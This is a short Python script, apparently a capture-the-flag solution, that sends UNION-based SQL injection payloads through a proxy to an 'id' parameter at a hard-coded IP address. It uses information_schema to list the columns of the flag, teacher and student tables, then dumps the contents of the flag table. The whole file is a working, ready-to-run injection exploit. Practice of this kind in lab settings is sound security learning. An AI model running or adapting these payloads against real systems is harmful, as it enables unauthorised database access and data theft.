import sys, re, os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "_tools"))
import px, urllib.parse

B = "http://103.163.47.230:34413/?id="
OP = px.opener("http://143.246.138.227:80")


def q(payload):
    s, h, b = px.get(B + urllib.parse.quote(payload, safe=""), OP)
    body = re.sub(r"\s+", " ", b)
    return re.findall(r"<td>(.*?)</td>", body), body


def show(label, payload):
    tds, body = q(payload)
    print("### %s -> %s" % (label, tds[:8] if tds else body[body.find('msg'):][:160]))
    return tds


show("flag 表列", "-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'-- -")
show("teacher 列", "-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='teacher'-- -")
show("student 列", "-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='student'-- -")
show("flag 内容*", "-1' union select 1,(select group_concat(flag) from flag),3-- -")
